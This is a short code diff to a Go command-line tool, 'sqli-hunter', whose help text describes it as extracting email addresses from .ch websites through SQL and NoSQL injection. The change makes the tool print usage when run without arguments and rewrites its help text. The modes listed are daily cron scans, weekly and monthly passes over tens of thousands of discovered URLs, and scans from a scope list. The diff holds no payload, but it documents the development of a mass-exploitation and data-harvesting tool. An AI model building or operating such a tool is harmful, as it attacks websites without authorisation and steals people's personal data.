@@ -41,7 +41,7 @@ func main() {
 	}
 
 	if len(os.Args) < 2 {
-		runDaily(nil)
+		printUsage()
 		return
 	}
 
@@ -501,14 +501,19 @@ func printUsage() {
 	fmt.Print(`sqli-hunter — extraction emails .ch (SQLi/NoSQL)
 
 Usage:
-  sqli-hunter                    Mode daily (nouveaux emails)
-  sqli-hunter daily [options]    Idem — discover + scan automatique
-  sqli-hunter big [options]      Grosse passe hebdo (40k URLs, rescan)
-  sqli-hunter weekly [options]   Idem — max vulns + emails / semaine
-  sqli-hunter monthly [options]  Passe mensuelle (80k URLs, max agressif)
-  sqli-hunter ch [options]       Discover + scan manuel
+  sqli-hunter <commande> [options]
+
+Commandes:
+  sqli-hunter daily [options]    Discover + scan quotidien (nouveaux emails)
+  sqli-hunter weekly [options]   Passe hebdo max (illimité, DBMS dorks)
+  sqli-hunter monthly [options]  Passe mensuelle max
+  sqli-hunter big [options]      Alias weekly
+  sqli-hunter ch [options]       Discover + scan manuel .ch
   sqli-hunter discover -d ch     Collecte URLs seulement
   sqli-hunter -l scope.txt       Scan une liste
+
+  sqli-hunter -h                 Aide complète
+  sqli-hunter --version
 
 Mode daily (cron quotidien) :
   sqli-hunter daily
